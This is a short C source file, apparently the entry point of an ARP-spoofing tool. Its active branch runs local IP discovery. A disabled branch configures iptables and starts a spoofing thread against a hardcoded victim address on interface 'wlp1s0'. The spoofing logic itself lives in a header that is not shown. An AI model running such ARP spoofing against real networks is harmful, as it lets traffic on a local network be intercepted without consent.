#include "core.h"
#include <pthread.h>
#include <signal.h>

int ICMP_SOCK = -1;
pthread_t ARP_SPOOF_TID = -1;
ARPSpoofArgs ARP_SPOOF_ARGS = {0};
LocalIPDiscoveryArgs LOCAL_IP_DISCOVERY_ARGS = {0};

void sigint_handler(int sig) {
    ARP_SPOOF_ARGS.is_terminated = 1;
}

#if 1
void main(void) {
    LOCAL_IP_DISCOVERY_ARGS.if_name = "wlp1s0";
    start_local_ip_discovery((void*)&LOCAL_IP_DISCOVERY_ARGS);
}
#else
void main(void) {
    reset_iptables();
    set_iptables();
    signal(SIGINT, sigint_handler);

    ARP_SPOOF_ARGS.if_name = "wlp1s0";
    ARP_SPOOF_ARGS.victim_addr_str = "192.168.0.101";
    ARP_SPOOF_ARGS.spoof_period_sec = 1;

    if (pthread_create(
            &ARP_SPOOF_TID, NULL, start_arp_spoof, (void*)&ARP_SPOOF_ARGS
        )
        != 0) {
        fprintf(
            stderr, "ERROR: Failed to create start_arp_spoof thread\n"
        );
        exit(1);
    }

    pthread_join(ARP_SPOOF_TID, NULL);
    reset_iptables();
    exit(0);
}
#endif
